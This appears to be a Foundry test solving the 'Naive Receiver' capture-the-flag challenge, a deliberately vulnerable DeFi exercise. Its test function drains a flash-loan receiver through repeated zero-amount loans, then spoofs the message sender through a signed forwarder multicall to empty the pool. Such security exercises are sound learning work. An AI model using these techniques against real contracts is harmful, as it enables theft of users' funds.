//SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test,console} from "forge-std/Test.sol";
import {NaiveReceiverPool,Multicall,WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverTesst is Test{



    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address feeReceiver = makeAddr("feeReceiver");
    address player;
    uint256 playerPk;

    uint256 WETH_IN_POOL = 1000e18;
    uint256 WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    function setUp() public {

        (player,playerPk) = makeAddrAndKey("player");///why,how??
        startHoax(deployer);

        weth = new WETH();
        forwarder = new BasicForwarder();
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder),payable(weth),feeReceiver);//why,how??

        receiver = new FlashLoanReceiver(address(pool)); //why.how??
        weth.deposit{value:WETH_IN_RECEIVER}();
        weth.transfer(address(receiver),WETH_IN_RECEIVER);//why,how??

        vm.stopPrank();

    }
    function test_Exploitt() public{
        assertEq(weth.balanceOf(address(pool)),1000e18);

        vm.startPrank(address(player));

        bytes memory data = "";
        
        for(uint256 i=0;i<10;i++){

            pool.flashLoan(receiver,address(weth),0,data);

        }

            vm.stopPrank();

        assertEq(weth.balanceOf(address(pool)),1010e18);

        bytes memory innercall = abi.encodeCall(NaiveReceiverPool.withdraw,(1000e18,payable(address(recovery))));
        bytes memory innercall2 = abi.encodeCall(NaiveReceiverPool.withdraw,(10e18,payable(address(recovery))));
        bytes memory modifiedcall = abi.encodePacked(innercall,deployer);
        bytes memory modifiedcall2 = abi.encodePacked(innercall2,feeReceiver);
        bytes[] memory calls = new bytes[](2);
        calls[0] = modifiedcall;
        calls[1] = modifiedcall2;
        bytes memory requestData = abi.encodeCall(Multicall.multicall,(calls));

        assertEq(weth.balanceOf(address(pool)),1010e18);



         uint256 privateKey = 0xA11CE;
         address signer = vm.addr(privateKey);

            BasicForwarder.Request memory request = BasicForwarder.Request({
            data: requestData,
            deadline: block.timestamp + 1 hours,
            from: address(signer),
            nonce: forwarder.nonces(player),
            value: 0,
            gas: 100000,
            target: address(pool)

           });

       

        bytes32 digest = keccak256(
        abi.encodePacked(
        "\x19\x01",
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)

        )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, digest);

         bytes memory signature = abi.encodePacked(r, s, v);




        bool success = forwarder.execute(request, signature);

        assertEq(weth.balanceOf(address(pool)),0e18);




    }

}
